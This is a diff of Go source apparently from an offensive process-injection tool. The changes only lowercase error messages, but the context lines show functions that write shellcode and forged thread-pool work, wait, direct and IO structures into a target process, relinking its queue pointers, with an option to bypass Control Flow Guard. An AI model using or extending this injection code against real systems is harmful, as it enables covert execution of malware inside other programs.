@@ -44,7 +44,7 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 	// Step 4: Write shellcode to start routine address
 	bytesWritten, err := injectWriteMemory(hProcess, workerFactoryInfo.StartRoutine, shellcode)
 	if err != nil {
-		return output, fmt.Errorf("Memory write failed: %w", err)
+		return output, fmt.Errorf("memory write failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote %d bytes to start routine address\n", bytesWritten)
 
@@ -195,7 +195,7 @@ func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	tpWorkBytes := (*[1 << 20]byte)(unsafe.Pointer(&tpWork))[:unsafe.Sizeof(tpWork)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpWorkAddr, tpWorkBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for work item failed: %w", err)
+		return output, fmt.Errorf("memory write for work item failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote work item structure (%d bytes)\n", bytesWritten)
 
@@ -214,7 +214,7 @@ func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	flinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
 	_, err = injectWriteMemory(hProcess, targetQueueListAddr, flinkBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for queue Flink failed: %w", err)
+		return output, fmt.Errorf("memory write for queue Flink failed: %w", err)
 	}
 
 	// Update queue's Blink based on whether queue was empty
@@ -232,7 +232,7 @@ func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	blinkBytes := (*[8]byte)(unsafe.Pointer(&blinkTarget))[:]
 	_, err = injectWriteMemory(hProcess, targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), blinkBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for queue Blink failed: %w", err)
+		return output, fmt.Errorf("memory write for queue Blink failed: %w", err)
 	}
 
 	// If there was an existing first item, update its Blink to point to our work item
@@ -243,7 +243,7 @@ func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		oldBlinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
 		_, err = injectWriteMemory(hProcess, oldFirstItemBlinkAddr, oldBlinkBytes)
 		if err != nil {
-			return output, fmt.Errorf("Memory write for old first item Blink failed: %w", err)
+			return output, fmt.Errorf("memory write for old first item Blink failed: %w", err)
 		}
 		output += "[*] Updated old first item's Blink pointer\n"
 	}
@@ -299,7 +299,7 @@ func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	tpWaitBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpWait))[:unsafe.Sizeof(tpWait)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpWaitAddr, tpWaitBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for wait item failed: %w", err)
+		return output, fmt.Errorf("memory write for wait item failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote wait item structure (%d bytes)\n", bytesWritten)
 
@@ -315,7 +315,7 @@ func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	tpDirectBytes := (*[1 << 20]byte)(unsafe.Pointer(&pWaitStruct.Direct))[:unsafe.Sizeof(tpDirect)]
 	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for direct item failed: %w", err)
+		return output, fmt.Errorf("memory write for direct item failed: %w", err)
 	}
 	output += "[+] Wrote direct item structure\n"
 
@@ -432,7 +432,7 @@ func executeVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	tpIoBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpIo))[:unsafe.Sizeof(tpIo)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpIoAddr, tpIoBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for IO item failed: %w", err)
+		return output, fmt.Errorf("memory write for IO item failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote IO item structure (%d bytes)\n", bytesWritten)
 
